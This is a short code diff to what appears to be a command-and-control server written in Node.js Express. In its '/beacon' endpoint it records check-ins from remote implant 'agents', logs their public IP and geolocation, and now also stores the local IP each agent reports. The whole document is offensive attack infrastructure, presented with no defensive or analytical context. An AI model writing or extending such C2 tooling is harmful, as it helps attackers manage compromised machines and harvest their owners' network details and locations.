@@ -211,6 +211,7 @@ c2app.post('/beacon', (req, res) => {
   const now = new Date().toISOString();
   // Prefer agent-provided publicIp when present (agent calls /whoami), else use x-forwarded-for / socket
   const providedPublic = (req.body && req.body.publicIp) ? String(req.body.publicIp).trim() : null;
+  const providedLocal = (req.body && req.body.localIp) ? String(req.body.localIp).trim() : null;
   const ipHeader = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown').toString();
   // Determine the IP we will use (agent-provided public IP preferred)
   const ipRaw = (providedPublic || ipHeader);
@@ -257,6 +258,9 @@ c2app.post('/beacon', (req, res) => {
   let agent = agents.get(agentID) || { id: agentID, cn, ip: ipNorm, firstSeen: now };
   agent.cn = cn;
   agent.ip = ipNorm;
+  if (providedLocal) {
+    agent.localIp = providedLocal;
+  }
   if (geo && Array.isArray(geo.ll)) {
     agent.lat = geo.ll[0];
     agent.lng = geo.ll[1];
